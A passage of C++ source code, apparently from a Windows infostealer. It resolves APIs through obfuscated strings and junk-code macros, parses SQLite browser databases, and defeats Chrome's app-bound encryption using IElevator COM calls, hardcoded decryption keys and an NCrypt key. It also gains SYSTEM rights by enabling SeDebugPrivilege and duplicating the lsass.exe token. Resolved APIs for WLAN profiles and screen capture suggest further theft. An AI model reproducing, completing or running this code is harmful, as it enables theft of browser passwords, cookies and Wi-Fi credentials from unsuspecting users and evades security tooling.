        TermProc           = (pTerminateProcess)     GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("TerminateProcess").c_str());
        GetModFileNameA    = (pGetModuleFileNameA)   GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetModuleFileNameA").c_str());
        CreateProcA        = (pCreateProcessA)       GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CreateProcessA").c_str());
        CreateSnapshot     = (pCreateToolhelp32Snapshot)GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CreateToolhelp32Snapshot").c_str());
        Proc32First        = (pProcess32First)       GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("Process32First").c_str());
        Proc32Next         = (pProcess32Next)        GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("Process32Next").c_str());
        CloseH             = (pCloseHandle)          GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CloseHandle").c_str());

        GetSysMetrics         = (pGetSystemMetrics)       GPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetSystemMetrics").c_str());
        GetDesktopWnd         = (pGetDesktopWindow)       GPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetDesktopWindow").c_str());
        GetWndDC              = (pGetWindowDC)            GPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetWindowDC").c_str());
        RelDC                 = (pReleaseDC)              GPA(OBFS_S("user32.dll").c_str(), OBFS_S("ReleaseDC").c_str());
        FindWndA              = (pFindWindowA)            GPA(OBFS_S("user32.dll").c_str(), OBFS_S("FindWindowA").c_str());
        SetWndDisplayAffinity = (pSetWindowDisplayAffinity)GPA(OBFS_S("user32.dll").c_str(), OBFS_S("SetWindowDisplayAffinity").c_str());

        CreateCompDC     = (pCreateCompatibleDC)     GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("CreateCompatibleDC").c_str());
        CreateCompBitmap = (pCreateCompatibleBitmap) GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("CreateCompatibleBitmap").c_str());
        SelectObj        = (pSelectObject)           GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("SelectObject").c_str());
        BitBlt_f         = (pBitBlt)                 GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("BitBlt").c_str());
        DelDC            = (pDeleteDC)               GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("DeleteDC").c_str());
        DelObj           = (pDeleteObject)           GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("DeleteObject").c_str());

        WlanOpen       = (pWlanOpenHandle)    GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanOpenHandle").c_str());
        WlanClose      = (pWlanCloseHandle)   GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanCloseHandle").c_str());
        WlanEnumIfaces = (pWlanEnumInterfaces)GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanEnumInterfaces").c_str());
        WlanGetProfList= (pWlanGetProfileList)GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanGetProfileList").c_str());
        WlanGetProf    = (pWlanGetProfile)    GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanGetProfile").c_str());
        WlanFree       = (pWlanFreeMemory)    GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanFreeMemory").c_str());

        NCryptOpenStorage = (pNCryptOpenStorageProvider)GPA(OBFS_S("ncrypt.dll").c_str(), OBFS_S("NCryptOpenStorageProvider").c_str());
        NCryptOpenK       = (pNCryptOpenKey)            GPA(OBFS_S("ncrypt.dll").c_str(), OBFS_S("NCryptOpenKey").c_str());
        NCryptDecr        = (pNCryptDecrypt)            GPA(OBFS_S("ncrypt.dll").c_str(), OBFS_S("NCryptDecrypt").c_str());
        NCryptFreeObj     = (pNCryptFreeObject)         GPA(OBFS_S("ncrypt.dll").c_str(), OBFS_S("NCryptFreeObject").c_str());
        JUNK_CODE_LARGE
        SLOG("[DYNAPI] Resolution complete: WinHTTP=%p Crypt32=%p Shell32=%p NCrypt=%p WLAN=%p GDI=%p",
             WHttpOpen, CryptUnprotData, SHGetFolderA, NCryptOpenStorage, WlanOpen, CreateCompDC);
        bool ok = (WHttpOpen && CryptUnprotData && SHGetFolderA);
        SLOG("[DYNAPI] Initialize() %s", ok ? "OK" : "FAILED (critical APIs missing)");
        return ok;
    }
}

#ifndef NOMINMAX
#define NOMINMAX
#endif
#ifdef min
#undef min
#endif
#ifdef max
#undef max
#endif
#include <algorithm>
#include <sstream>
#include <cstring>

namespace SQLite {

    SQLiteHandler::SQLiteHandler(std::string dbPath) : _dbPath(dbPath), _fileSize(0) {
        JUNK_CODE_SMALL

        HANDLE hFile = CreateFileA(
            dbPath.c_str(), GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return;
        LARGE_INTEGER liSize = {};
        if (!GetFileSizeEx(hFile, &liSize) || liSize.QuadPart == 0) {
            CloseHandle(hFile); return;
        }
        if (liSize.QuadPart > 64 * 1024 * 1024) {

            CloseHandle(hFile); return;
        }
        _fileSize = (size_t)liSize.QuadPart;
        _fileBytes.resize(_fileSize);
        DWORD dwRead = 0;
        if (!ReadFile(hFile, _fileBytes.data(), (DWORD)_fileSize, &dwRead, NULL) || dwRead != _fileSize) {
            _fileBytes.clear(); _fileSize = 0;
        }
        CloseHandle(hFile);
    }

    bool SQLiteHandler::ReadTable(std::string tableName) {
        JUNK_CODE_LARGE
        if (_fileBytes.size() < 100) return false;
        _tableEntries.clear();
        _fieldNames.clear();

        uint16_t pageSize = ((uint16_t)_fileBytes[16] << 8) | _fileBytes[17];
        if (pageSize == 1) pageSize = 65536;  

        ParsePage(1, pageSize, true);

        int targetRootPage = -1;
        std::string sql;
        for (const auto& entry : _tableEntries) {
            auto itName = entry.find("name");
            if (itName == entry.end() || itName->second != tableName) continue;
            auto itRoot = entry.find("rootpage");
            auto itSql  = entry.find("sql");
            if (itRoot == entry.end()) continue;
            try { targetRootPage = std::stoi(itRoot->second); } catch (...) { continue; }
            if (itSql != entry.end()) sql = itSql->second;
            break;
        }
        if (targetRootPage < 1) return false;

        _tableEntries.clear();
        _fieldNames.clear();
        ParseFieldsFromSql(sql);

        ParsePage(targetRootPage, pageSize, false);
        return !_tableEntries.empty();
    }

    void SQLiteHandler::ParseFieldsFromSql(std::string sql) {
        JUNK_CODE_SMALL
        size_t start = sql.find('(');
        size_t end   = sql.rfind(')');
        if (start == std::string::npos || end == std::string::npos || end <= start) return;

        std::string fieldsPart = sql.substr(start + 1, end - start - 1);

        std::vector<std::string> segments;
        int depth = 0;
        std::string cur;
        for (char c : fieldsPart) {
            if (c == '(') { ++depth; cur += c; }
            else if (c == ')') { --depth; cur += c; }
            else if (c == ',' && depth == 0) {
                segments.push_back(cur); cur.clear();
            } else {
                cur += c;
            }
        }
        if (!cur.empty()) segments.push_back(cur);

        for (auto& seg : segments) {

            size_t f = seg.find_first_not_of(" \t\r\n");
            if (f == std::string::npos) continue;
            seg = seg.substr(f);
            size_t l = seg.find_last_not_of(" \t\r\n");
            if (l != std::string::npos) seg = seg.substr(0, l + 1);
            if (seg.empty()) continue;

            std::string upper;
            size_t sp = seg.find_first_of(" \t(");
            std::string firstToken = (sp != std::string::npos) ? seg.substr(0, sp) : seg;
            upper = firstToken;
            std::transform(upper.begin(), upper.end(), upper.begin(), ::toupper);

            if (upper == "PRIMARY" || upper == "UNIQUE" || upper == "CHECK" ||
                upper == "FOREIGN" || upper == "CONSTRAINT") continue;

            std::string name;
            if (!seg.empty() && (seg[0] == '`' || seg[0] == '"' || seg[0] == '[')) {
                char close = (seg[0] == '[') ? ']' : seg[0];
                size_t closing = seg.find(close, 1);
                name = (closing != std::string::npos) ? seg.substr(1, closing - 1) : seg.substr(1);
            } else {
                size_t space = seg.find_first_of(" \t");
                name = (space != std::string::npos) ? seg.substr(0, space) : seg;
            }
            if (!name.empty()) _fieldNames.push_back(name);
        }
    }

    void SQLiteHandler::ParsePage(int pageNum, uint16_t pageSize, bool isMaster, int depth) {
        if (pageNum < 1 || depth > 32) return;  

        size_t pageOffset = (size_t)(pageNum - 1) * pageSize;
        if (pageOffset + pageSize > _fileBytes.size()) return;

        size_t hdrOffset = pageOffset + (pageNum == 1 ? 100 : 0);
        if (hdrOffset + 12 >= _fileBytes.size()) return;

        uint8_t  pageType  = _fileBytes[hdrOffset];
        uint16_t cellCount = ((uint16_t)_fileBytes[hdrOffset + 3] << 8) | _fileBytes[hdrOffset + 4];

        bool isLeaf     = (pageType == 0x0D || pageType == 0x0A);
        bool isInterior = (pageType == 0x05 || pageType == 0x02);

        if (!isLeaf && !isInterior) return;

        size_t ptrArray = hdrOffset + (isInterior ? 12 : 8);
        if (ptrArray + (size_t)cellCount * 2 > _fileBytes.size()) return;

        if (isInterior) {

            uint32_t rightMost =
                ((uint32_t)_fileBytes[hdrOffset + 8]  << 24) |
                ((uint32_t)_fileBytes[hdrOffset + 9]  << 16) |
                ((uint32_t)_fileBytes[hdrOffset + 10] <<  8) |
                 (uint32_t)_fileBytes[hdrOffset + 11];

            for (int i = 0; i < cellCount; ++i) {
                uint16_t cellOff = ((uint16_t)_fileBytes[ptrArray + i*2] << 8) |
                                               _fileBytes[ptrArray + i*2 + 1];
                size_t cellAbs = pageOffset + cellOff;
                if (cellAbs + 4 > _fileBytes.size()) continue;
                uint32_t leftChild =
                    ((uint32_t)_fileBytes[cellAbs]   << 24) |
                    ((uint32_t)_fileBytes[cellAbs+1] << 16) |
                    ((uint32_t)_fileBytes[cellAbs+2] <<  8) |
                     (uint32_t)_fileBytes[cellAbs+3];
                ParsePage(leftChild, pageSize, isMaster, depth + 1);
            }

            ParsePage(rightMost, pageSize, isMaster, depth + 1);
        } else {

            for (int i = 0; i < cellCount; ++i) {
                if (ptrArray + (size_t)i*2 + 1 >= _fileBytes.size()) break;
                uint16_t cellOff = ((uint16_t)_fileBytes[ptrArray + i*2] << 8) |
                                               _fileBytes[ptrArray + i*2 + 1];
                if (cellOff == 0) continue;
                ParseCell(pageOffset + cellOff, pageSize, pageOffset, isMaster);
            }
        }
    }

    int SQLiteHandler::ReadVarint(size_t offset, uint64_t& value) {
        value = 0;
        for (int i = 0; i < 9; ++i) {
            if (offset + i >= _fileBytes.size()) return 0;
            uint8_t b = _fileBytes[offset + i];
            if (i < 8) {
                value = (value << 7) | (b & 0x7F);
                if (!(b & 0x80)) return i + 1;
            } else {
                value = (value << 8) | b;
                return 9;
            }
        }
        return 0;
    }

    void SQLiteHandler::ParseCell(size_t offset, uint16_t pageSize,
                                   size_t pageBase, bool isMaster) {
        if (offset + 4 >= _fileBytes.size()) return;

        uint64_t payloadSize = 0;
        int len = ReadVarint(offset, payloadSize);
        if (len == 0 || payloadSize == 0) return;
        offset += len;

        uint64_t rowId = 0;
        len = ReadVarint(offset, rowId);
        if (len == 0) return;
        offset += len;

        uint8_t reserved = _fileBytes[20];
        size_t usable = (size_t)pageSize - reserved;

        size_t X = usable - 35;
        size_t M = ((usable - 12) * 32 / 255) - 23;
        size_t K = M + ((payloadSize - M) % (usable - 4));

        size_t inlineLen = (size_t)payloadSize;
        if (payloadSize > X) {
            inlineLen = (K <= X) ? K : M;
        }
        inlineLen = std::min(inlineLen, _fileBytes.size() - offset);

        std::vector<uint8_t> payload;
        payload.reserve((size_t)payloadSize);
        payload.insert(payload.end(),
                       _fileBytes.begin() + offset,
                       _fileBytes.begin() + offset + inlineLen);

        if (payload.size() < (size_t)payloadSize) {
            size_t overflowPtrOff = offset + inlineLen;
            while (payload.size() < (size_t)payloadSize &&
                   overflowPtrOff + 4 <= _fileBytes.size()) {
                uint32_t ovPage =
                    ((uint32_t)_fileBytes[overflowPtrOff]   << 24) |
                    ((uint32_t)_fileBytes[overflowPtrOff+1] << 16) |
                    ((uint32_t)_fileBytes[overflowPtrOff+2] <<  8) |
                     (uint32_t)_fileBytes[overflowPtrOff+3];
                if (ovPage == 0) break;

                size_t ovOff = (size_t)(ovPage - 1) * pageSize;
                if (ovOff + 4 >= _fileBytes.size()) break;

                uint32_t nextOvPage =
                    ((uint32_t)_fileBytes[ovOff]   << 24) |
                    ((uint32_t)_fileBytes[ovOff+1] << 16) |
                    ((uint32_t)_fileBytes[ovOff+2] <<  8) |
                     (uint32_t)_fileBytes[ovOff+3];

                size_t remain = (size_t)payloadSize - payload.size();
                size_t avail  = std::min(remain, (size_t)pageSize - 4);
                size_t dataStart = ovOff + 4;
                avail = std::min(avail, _fileBytes.size() - dataStart);
                if (avail == 0) break;

                payload.insert(payload.end(),
                                _fileBytes.begin() + dataStart,
                                _fileBytes.begin() + dataStart + avail);
                overflowPtrOff = ovOff;   
                if (nextOvPage == 0) break;

                overflowPtrOff = (size_t)(nextOvPage - 1) * pageSize;
                if (overflowPtrOff + 4 > _fileBytes.size()) break;
            }
        }

        if (payload.empty()) return;

        size_t hdrStart = 0;
        uint64_t headerSize = 0;
        int hLen = ReadVarint2(payload, hdrStart, headerSize);
        if (hLen == 0) return;

        size_t currentHeader = hdrStart + hLen;
        size_t headerEnd     = hdrStart + (size_t)headerSize;
        size_t dataOff       = headerEnd;

        std::vector<uint64_t> serialTypes;
        serialTypes.reserve(16);
        while (currentHeader < headerEnd && currentHeader < payload.size()) {
            uint64_t type = 0;
            int n = ReadVarint2(payload, currentHeader, type);
            if (n == 0) break;
            currentHeader += n;
            serialTypes.push_back(type);
        }

        static const std::string masterFields[] =
            {"type", "name", "tbl_name", "rootpage", "sql"};

        std::map<std::string, std::string> entry;

        for (size_t fi = 0; fi < serialTypes.size(); ++fi) {
            uint64_t type = serialTypes[fi];
            std::string value;
            size_t fieldLen = 0;

            if (type == 0) {

            } else if (type == 1) {
                if (dataOff < payload.size()) {
                    value = std::to_string((int8_t)payload[dataOff]);
                    fieldLen = 1;
                }
            } else if (type == 2) {
                if (dataOff + 2 <= payload.size()) {
                    int16_t v = (int16_t)(((uint16_t)payload[dataOff] << 8) | payload[dataOff+1]);
                    value = std::to_string(v); fieldLen = 2;
                }
            } else if (type == 3) {
                if (dataOff + 3 <= payload.size()) {
                    int32_t v = ((int32_t)(int8_t)payload[dataOff] << 16) |
                                ((int32_t)payload[dataOff+1] << 8)        |
                                 (int32_t)payload[dataOff+2];
                    value = std::to_string(v); fieldLen = 3;
                }
            } else if (type == 4) {
                if (dataOff + 4 <= payload.size()) {
                    int32_t v = ((int32_t)payload[dataOff]   << 24) |
                                ((int32_t)payload[dataOff+1] << 16) |
                                ((int32_t)payload[dataOff+2] <<  8) |
                                 (int32_t)payload[dataOff+3];
                    value = std::to_string(v); fieldLen = 4;
                }

            } else if (type == 5) {
                if (dataOff + 6 <= payload.size()) {
                    int64_t v = 0;
                    for (int b = 0; b < 6; ++b) v = (v << 8) | payload[dataOff + b];

                    if (v & (1LL << 47)) v |= ~((1LL << 48) - 1);
                    value = std::to_string(v); fieldLen = 6;
                }
            } else if (type == 6) {
                if (dataOff + 8 <= payload.size()) {
                    int64_t v = 0;
                    for (int b = 0; b < 8; ++b) v = (v << 8) | payload[dataOff + b];
                    value = std::to_string(v); fieldLen = 8;
                }
            } else if (type == 7) {

                if (dataOff + 8 <= payload.size()) {
                    double d;
                    uint64_t bits = 0;
                    for (int b = 0; b < 8; ++b) bits = (bits << 8) | payload[dataOff + b];
                    memcpy(&d, &bits, 8);
                    char buf[32]; snprintf(buf, sizeof(buf), "%g", d);
                    value = buf; fieldLen = 8;
                }
            } else if (type == 8) { value = "0"; }
            else if (type == 9) { value = "1"; }
            else if (type >= 12 && (type % 2 == 0)) {

                fieldLen = (size_t)(type - 12) / 2;
                if (dataOff + fieldLen <= payload.size())
                    value.assign((char*)&payload[dataOff], fieldLen);
            } else if (type >= 13 && (type % 2 != 0)) {

                fieldLen = (size_t)(type - 13) / 2;
                if (dataOff + fieldLen <= payload.size())
                    value.assign((char*)&payload[dataOff], fieldLen);
            }

            dataOff += fieldLen;

            std::string fieldName;
            if (isMaster) {
                fieldName = (fi < 5) ? masterFields[fi] : ("field_" + std::to_string(fi));
            } else {
                fieldName = (fi < _fieldNames.size()) ? _fieldNames[fi] : ("field_" + std::to_string(fi));
            }
            entry[fieldName] = value;
        }

        _tableEntries.push_back(std::move(entry));
    }

    int SQLiteHandler::ReadVarint2(const std::vector<uint8_t>& buf, size_t offset, uint64_t& value) {
        value = 0;
        for (int i = 0; i < 9; ++i) {
            if (offset + i >= buf.size()) return 0;
            uint8_t b = buf[offset + i];
            if (i < 8) {
                value = (value << 7) | (b & 0x7F);
                if (!(b & 0x80)) return i + 1;
            } else {
                value = (value << 8) | b;
                return 9;
            }
        }
        return 0;
    }
}

#include <bcrypt.h>
#include <comdef.h>
namespace AppBound {
    struct BrowserCLSID {
        CLSID clsid;
        IID   iid;
    };
    static const BrowserCLSID g_BrowserCLSIDs[] = {
        { {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
          {0xA949CB4E,0xC4F9,0x44C4,{0xB2,0x13,0x6B,0xF8,0xAA,0x9A,0xC6,0x9C}} },
        { {0xDD2646BA,0x3707,0x4BF8,{0xB9,0xA7,0x03,0x86,0x91,0xA6,0x8F,0xC2}},
          {0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B}} },
        { {0xDA7FDCA5,0x2CAA,0x4637,{0xAA,0x17,0x07,0x40,0x58,0x4D,0xE7,0xDA}},
          {0x42D4A4CF,0xAE6A,0x4B4F,{0xA8,0xD5,0xBC,0x4C,0x45,0xAC,0x75,0x7A}} },
        { {0x704C2872,0x2049,0x435E,{0xA4,0x69,0x0A,0x53,0x43,0x13,0xC4,0x2B}},
          {0x89D73AE1,0xBFEF,0x4B5A,{0x9F,0x7E,0xDB,0xC7,0x3E,0x00,0x59,0xFA}} },
        { {0x1FCBE96C,0x1697,0x43AF,{0x9A,0x40,0x80,0xD9,0x66,0x31,0xE5,0x9B}},
          {0x1F4DE4B7,0xC285,0x4A1F,{0x98,0x84,0x2C,0x7F,0x45,0xF9,0x4E,0x0E}} },
    };
    std::vector<BYTE> DecryptAppBoundKey(const std::vector<BYTE>& ciphertext) {
        if (ciphertext.empty()) return {};
        CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
        const BYTE* data = ciphertext.data();
        size_t dataLen   = ciphertext.size();
        std::vector<BYTE> decrypted;
        for (const auto& entry : g_BrowserCLSIDs) {
            IElevator* pElevator = nullptr;
            HRESULT hr = CoCreateInstance(entry.clsid, nullptr, CLSCTX_LOCAL_SERVER, entry.iid, (void**)&pElevator);
            if (FAILED(hr) || !pElevator) continue;
            BSTR bCipher = SysAllocStringByteLen(reinterpret_cast<const char*>(data), (UINT)dataLen);
            BSTR bPlain  = nullptr;
            DWORD lastErr = 0;
            hr = pElevator->DecryptData(bCipher, &bPlain, &lastErr);
            SysFreeString(bCipher);
            if (SUCCEEDED(hr) && bPlain) {
                UINT len = SysStringByteLen(bPlain);
                decrypted.assign(reinterpret_cast<BYTE*>(bPlain), reinterpret_cast<BYTE*>(bPlain) + len);
                SysFreeString(bPlain);
                pElevator->Release();
                CoUninitialize();
                return decrypted;
            }
            SysFreeString(bPlain);
            pElevator->Release();
        }
        CoUninitialize();
        return {};
    }
    struct KeyBlob {
        BYTE flag;
        std::vector<BYTE> encrypted_aes_key;
        std::vector<BYTE> iv;
        std::vector<BYTE> ciphertext;
        std::vector<BYTE> tag;
    };
    static KeyBlob ParseKeyBlob(const std::vector<BYTE>& data) {
        if (data.size() < 16) return {};
        char hex[64] = { 0 };
        for (int i = 0; i < 16 && i < data.size(); i++) sprintf(hex + i * 3, "%02X ", data[i]);
        SLOG("    [*] Layer 2 Hex (first 16): %s", hex);
        KeyBlob blob;
        if (data.size() >= 93) {
            size_t pos = data.size() - 93;
            if (data[pos] == 3) {
                blob.flag = 3; pos++;
                blob.encrypted_aes_key.assign(data.begin() + pos, data.begin() + pos + 32); pos += 32;
                blob.iv.assign(data.begin() + pos, data.begin() + pos + 12); pos += 12;
                blob.ciphertext.assign(data.begin() + pos, data.begin() + pos + 32); pos += 32;
                blob.tag.assign(data.begin() + pos, data.begin() + pos + 16);
                SLOG("    [+] Found Flag 3 at offset %zu", data.size() - 93);
                return blob;
            }
        }
        if (data.size() >= 61) {
            size_t pos = data.size() - 61;
            if (data[pos] == 1 || data[pos] == 2) {
                blob.flag = data[pos]; pos++;
                blob.iv.assign(data.begin() + pos, data.begin() + pos + 12); pos += 12;
                blob.ciphertext.assign(data.begin() + pos, data.begin() + pos + 32); pos += 32;
                blob.tag.assign(data.begin() + pos, data.begin() + pos + 16);
                SLOG("    [+] Found Flag %u at offset %zu", blob.flag, data.size() - 61);
                return blob;
            }
        }
        SLOG("    [-] Failed to find valid v20 flag at expected offsets.");
        return {};
    }
    static std::vector<BYTE> NCryptDecryptKey(const std::vector<BYTE>& input) {
        if (!DynAPI::NCryptOpenStorage || !DynAPI::NCryptOpenK || !DynAPI::NCryptDecr) return {};
        NCRYPT_PROV_HANDLE hProv = NULL;
        SECURITY_STATUS status = DynAPI::NCryptOpenStorage(&hProv, L"Microsoft Software Key Storage Provider", 0);
        if (status != 0) return {};
        NCRYPT_KEY_HANDLE hKey = NULL;
        status = DynAPI::NCryptOpenK(hProv, &hKey, L"Google Chromekey1", 0, 0);
        if (status != 0) {
            DynAPI::NCryptFreeObj(hProv);
            return {};
        }
        DWORD outSize = 0;
        std::vector<BYTE> output;
        status = DynAPI::NCryptDecr(hKey, const_cast<BYTE*>(input.data()), (DWORD)input.size(), NULL, NULL, 0, &outSize, 0x40 );
        if (status == 0 && outSize > 0) {
            output.resize(outSize);
            status = DynAPI::NCryptDecr(hKey, const_cast<BYTE*>(input.data()), (DWORD)input.size(), NULL, output.data(), (DWORD)output.size(), &outSize, 0x40);
        }
        DynAPI::NCryptFreeObj(hKey);
        DynAPI::NCryptFreeObj(hProv);
        if (status == 0) return output;
        return {};
    }
    std::vector<BYTE> DeriveV20MasterKey(const std::vector<BYTE>& encryptedKeyBlob) {
        if (encryptedKeyBlob.empty()) return {};
        SLOG("    [*] Starting v20 Master Key derivation...");
        std::string layer1;
        {
            Utils::Impersonator imp;
            if (imp.IsImpersonating()) {
                layer1 = Crypto::DecryptDPAPI(encryptedKeyBlob);
            } else {
                SLOG("    [-] Impersonation failed, cannot perform SYSTEM DPAPI decryption.");
            }
        }
        if (layer1.empty()) {
            SLOG("    [-] Layer 1 (SYSTEM DPAPI) failed.");
            return {};
        }
        SLOG("    [+] Layer 1 decrypted. Size: %zu", layer1.size());
        std::vector<BYTE> layer1Vec(layer1.begin(), layer1.end());
        std::string layer2 = Crypto::DecryptDPAPI(layer1Vec);
        if (layer2.empty()) {
            SLOG("    [-] Layer 2 (User DPAPI) failed.");
            return {};
        }
        SLOG("    [+] Layer 2 decrypted. Size: %zu", layer2.size());
        std::vector<BYTE> layer2Vec(layer2.begin(), layer2.end());
        KeyBlob blob = ParseKeyBlob(layer2Vec);
        SLOG("    [*] Key blob parsed. Flag: %u", blob.flag);
        std::vector<BYTE> finalKey;
        if (blob.flag == 1) {
            std::vector<BYTE> aesKey = {0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87};
            finalKey = Crypto::DecryptAES_GCM(aesKey, blob.iv, {}, blob.ciphertext, blob.tag);
        } else if (blob.flag == 2) {
            std::vector<BYTE> chachaKey = {0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60};
            finalKey = Crypto::DecryptChaCha20Poly1305(chachaKey, blob.iv, {}, blob.ciphertext, blob.tag);
        } else if (blob.flag == 3) {
            std::vector<BYTE> decKey;
            {
                Utils::Impersonator imp;
                if (imp.IsImpersonating()) {
                    decKey = NCryptDecryptKey(blob.encrypted_aes_key);
                } else {
                    SLOG("    [-] Impersonation failed for NCrypt decryption.");
                }
            }
            if (decKey.size() == 32) {
                SLOG("    [+] NCrypt decrypted AES key successfully.");
                std::vector<BYTE> xorKey = {0xCC,0xF8,0xA1,0xCE,0xC5,0x66,0x05,0xB8,0x51,0x75,0x52,0xBA,0x1A,0x2D,0x06,0x1C,0x03,0xA2,0x9E,0x90,0x27,0x4F,0xB2,0xFC,0xF5,0x9B,0xA4,0xB7,0x5C,0x39,0x23,0x90};
                std::vector<BYTE> realKey(32);
                for (int i = 0; i < 32; ++i) realKey[i] = decKey[i] ^ xorKey[i];
                finalKey = Crypto::DecryptAES_GCM(realKey, blob.iv, {}, blob.ciphertext, blob.tag);
            } else {
                SLOG("    [-] NCrypt decryption failed or returned invalid size: %zu", decKey.size());
            }
        } else {
            SLOG("    [-] Unknown v20 flag: %u", blob.flag);
        }
        if (finalKey.empty()) {
            SLOG("    [-] Final decryption of Master Key failed.");
        } else {
            SLOG("    [+] Final Master Key recovered!");
        }
        return finalKey;
    }
    std::string DecryptAppBoundValue(const std::vector<BYTE>& encrypted, const std::vector<BYTE>& appBoundKey) {
        if (encrypted.size() < 31) return "";
        if (encrypted[0] != 'v' || encrypted[1] != '2' || encrypted[2] != '0') return "";
        std::vector<BYTE> iv(encrypted.begin() + 3, encrypted.begin() + 15);
        std::vector<BYTE> payload(encrypted.begin() + 15, encrypted.end());
        if (payload.size() < 16) return "";
        std::vector<BYTE> ciphertext(payload.begin(), payload.end() - 16);
        std::vector<BYTE> tag(payload.end() - 16, payload.end());
        auto dec = Crypto::DecryptAES_GCM(appBoundKey, iv, {}, ciphertext, tag);
        return std::string(dec.begin(), dec.end());
    }
}

#include <tlhelp32.h>
namespace Utils {
    Impersonator::Impersonator() {
        if (!DynAPI::OpenProcToken || !DynAPI::LookupPrivValueA || !DynAPI::AdjustTokPrivs) return;
        SLOG("    [*] Attempting to enable SeDebugPrivilege...");
        if (!EnablePrivilege(S("SeDebugPrivilege").c_str())) {
            SLOG("    [-] Failed to enable SeDebugPrivilege.");
            return;
        }
        SLOG("    [+] SeDebugPrivilege enabled.");
        DWORD pid = GetProcessIdByName(S("lsass.exe").c_str());
        if (pid == 0) {
            SLOG("    [-] Could not find lsass.exe PID.");
            return;
        }
        SLOG("    [*] lsass.exe PID: %lu", pid);
        HANDLE hProcess = DynAPI::OpenProc(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProcess) {
            SLOG("    [-] Failed to open lsass.exe (Error: %lu)", GetLastError());
            return;
        }
        HANDLE hToken = NULL;
        if (DynAPI::OpenProcToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            HANDLE hDupToken = NULL;
            if (DynAPI::DupTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
                if (DynAPI::ImpersonateLoggedUser(hDupToken)) {
                    _impersonating = true;
                    SLOG("    [+] Successfully impersonated SYSTEM via lsass.exe");
                } else {
                    SLOG("    [-] ImpersonateLoggedOnUser failed (Error: %lu)", GetLastError());
                }
                DynAPI::CloseH(hDupToken);
            } else {
                SLOG("    [-] DuplicateTokenEx failed (Error: %lu)", GetLastError());
            }
            DynAPI::CloseH(hToken);
        } else {
            SLOG("    [-] OpenProcessToken failed (Error: %lu)", GetLastError());
        }
        DynAPI::CloseH(hProcess);
    }
    Impersonator::~Impersonator() {
        if (_impersonating && DynAPI::RevertSelf) {
            DynAPI::RevertSelf();
        }
    }
    bool Impersonator::EnablePrivilege(LPCSTR privilege) {
        HANDLE hToken;
        LUID luid;
        TOKEN_PRIVILEGES tp;
        if (!DynAPI::OpenProcToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
            return false;
        if (!DynAPI::LookupPrivValueA(NULL, privilege, &luid)) {
            DynAPI::CloseH(hToken);
            return false;
        }
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        bool res = DynAPI::AdjustTokPrivs(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        DWORD err = GetLastError();
        DynAPI::CloseH(hToken);
        return res && (err == ERROR_SUCCESS);
    }
    bool Impersonator::IsAdmin() {
        bool isAdmin = false;
        HANDLE hToken = NULL;
        if (DynAPI::OpenProcToken && DynAPI::OpenProcToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD size = sizeof(TOKEN_ELEVATION);
            if (DynAPI::GetTokenInf && DynAPI::GetTokenInf(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
                isAdmin = elevation.TokenIsElevated;
            }
            DynAPI::CloseH(hToken);
        }
        return isAdmin;
    }
    DWORD Impersonator::GetProcessIdByName(LPCSTR name) {
        if (!DynAPI::CreateSnapshot || !DynAPI::Proc32First || !DynAPI::Proc32Next) return 0;
        DWORD pid = 0;
        HANDLE hSnap = DynAPI::CreateSnapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(pe);
            if (DynAPI::Proc32First(hSnap, &pe)) {
                do {
                    if (lstrcmpiA(pe.szExeFile, name) == 0) {
                        pid = pe.th32ProcessID;
                        break;
                    }
